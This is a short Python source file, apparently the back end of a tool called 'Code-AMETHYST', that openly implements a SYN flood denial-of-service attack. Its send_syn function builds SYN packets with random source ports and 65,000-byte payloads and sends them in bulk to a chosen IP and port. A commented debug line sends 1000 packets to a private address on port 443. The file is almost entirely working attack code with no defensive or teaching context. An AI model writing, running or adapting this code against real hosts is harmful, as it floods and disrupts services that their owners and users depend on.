# Code-AMETHYST ver2.
# Back-end SYN Flood Attack code

# Modules
from head import IP, TCP, Raw, send, RandShort

# Functions
def send_syn(target_ip: str, target_port: int, total_packets: int = 4):

    print("Sending " + str(total_packets) + " packets to ip " + target_ip)

    packet_size = 65000
    
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * packet_size)
    p = ip / tcp / raw

    send(p, count=total_packets, verbose=0)
    print("Successfully sent " + str(total_packets) + " packets of " + str(packet_size) + " size to " + target_ip + " on port " + str(target_port))

# For debugging purposes, use the code below

# ip = "172.22.8.1"
# port = 443
# send_syn(ip, port, total_packets=1000)